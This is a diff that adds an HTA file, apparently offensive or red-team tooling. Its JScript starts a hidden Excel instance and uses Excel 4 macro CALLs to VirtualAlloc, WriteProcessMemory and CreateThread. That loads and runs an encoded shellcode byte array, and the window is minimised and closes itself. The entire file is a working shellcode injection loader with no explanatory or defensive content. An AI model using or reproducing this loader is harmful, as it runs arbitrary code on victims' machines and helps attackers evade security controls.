@@ -1,0 +1,35 @@
+
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HTA:APPLICATION ID="test" WINDOWSTATE="minimize">
+<head>
+
+	<title>Test HTA</title>
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=9">
+
+	<script language="JScript">
+	  var excelObj = new ActiveXObject("Excel.Application");
+
+	  excelObj.visible = false;
+
+	  var _shArr = ["CHAR(217)","CHAR(205)","CHAR(217)","CHAR(116)","CHAR(36)","CHAR(244)","CHAR(190)","CHAR(222)","CHAR(222)","CHAR(148)","CHAR(187)","CHAR(95)","CHAR(41)","CHAR(201)","CHAR(177)","CHAR(49)","CHAR(49)","CHAR(119)","CHAR(24)","CHAR(131)","CHAR(239)","CHAR(252)","CHAR(3)","CHAR(119)","CHAR(202)","CHAR(60)","CHAR(97)","CHAR(71)","CHAR(26)","CHAR(66)","CHAR(138)","CHAR(184)","CHAR(218)","CHAR(35)","CHAR(2)","CHAR(93)","CHAR(235)","CHAR(99)","CHAR(112)","CHAR(21)","CHAR(91)","CHAR(84)","CHAR(242)","CHAR(123)","CHAR(87)","CHAR(31)","CHAR(86)","CHAR(104)","CHAR(236)","CHAR(109)","CHAR(127)","CHAR(159)","CHAR(69)","CHAR(219)","CHAR(89)","CHAR(174)","CHAR(86)","CHAR(112)","CHAR(153)","CHAR(177)","CHAR(212)","CHAR(139)","CHAR(206)","CHAR(17)","CHAR(229)","CHAR(67)","CHAR(3)","CHAR(83)","CHAR(34)","CHAR(185)","CHAR(238)","CHAR(1)","CHAR(251)","CHAR(181)","CHAR(93)","CHAR(182)","CHAR(136)","CHAR(128)","CHAR(93)","CHAR(61)","CHAR(194)","CHAR(5)","CHAR(230)","CHAR(162)","CHAR(146)","CHAR(36)","CHAR(199)","CHAR(116)","CHAR(169)","CHAR(126)","CHAR(199)","CHAR(119)","CHAR(126)","CHAR(11)","CHAR(78)","CHAR(96)","CHAR(99)","CHAR(54)","CHAR(24)","CHAR(27)","CHAR(87)","CHAR(204)","CHAR(155)","CHAR(205)","CHAR(166)","CHAR(45)","CHAR(55)","CHAR(48)","CHAR(7)","CHAR(220)","CHAR(73)","CHAR(116)","CHAR(175)","CHAR(63)","CHAR(60)","CHAR(140)","CHAR(204)","CHAR(194)","CHAR(71)","CHAR(75)","CHAR(175)","CHAR(24)","CHAR(205)","CHAR(72)","CHAR(23)","CHAR(234)","CHAR(117)","CHAR(181)","CHAR(166)","CHAR(63)","CHAR(227)","CHAR(62)","CHAR(164)","CHAR(244)","CHAR(103)","CHAR(24)","CHAR(168)","CHAR(11)","CHAR(171)","CHAR(18)","CHAR(212)","CHAR(128)","CHAR(74)","CHAR(245)","CHAR(93)","CHAR(210)","CHAR(104)","CHAR(209)","CHAR(6)","CHAR(128)","CHAR(17)","CHAR(64)","CHAR(226)","CHAR(103)","CHAR(45)","CHAR(146)","CHAR(77)","CHAR(215)","CHAR(139)","CHAR(216)","CHAR(99)","CHAR(12)","CHAR(166)","CHAR(130)","CHAR(233)","CHAR(211)","CHAR(52)","CHAR(185)","CHAR(95)","CHAR(211)","CHAR(70)","CHAR(194)","CHAR(207)","CHAR(188)","CHAR(119)","CHAR(73)","CHAR(128)","CHAR(187)","CHAR(135)","CHAR(152)","CHAR(229)","CHAR(52)","CHAR(194)","CHAR(129)","CHAR(79)","CHAR(221)","CHAR(139)","CHAR(83)","CHAR(210)","CHAR(128)","CHAR(43)","CHAR(142)","CHAR(16)","CHAR(189)","CHAR(175)","CHAR(59)","CHAR(232)","CHAR(58)","CHAR(175)","CHAR(73)","CHAR(237)","CHAR(7)","CHAR(119)","CHAR(161)","CHAR(159)","CHAR(24)","CHAR(18)","CHAR(197)","CHAR(12)","CHAR(24)","CHAR(55)","CHAR(166)","CHAR(211)","CHAR(138)","CHAR(219)","CHAR(7)","CHAR(118)","CHAR(43)","CHAR(121)","CHAR(88)"];
+
+	  var addr = excelObj.ExecuteExcel4Macro('CALL("Kernel32","VirtualAlloc","JJJJJ",0,' + _shArr.length + ',4096,64)')
+	  var i = 0;
+
+	  for (i = 0; i < _shArr.length; i++) {
+		var ret = excelObj.ExecuteExcel4Macro('CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, ' + (addr + i) + ',' + _shArr[i] + ', 1, 0)')
+	  }
+
+	  excelObj.ExecuteExcel4Macro('CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, ' + addr + ', 0, 0, 0)')
+	  
+	  // comment this line if you want to keep the mshta.exe window open.
+	  self.close();
+
+	</script>
+
+</head>
+
+</html>
+	
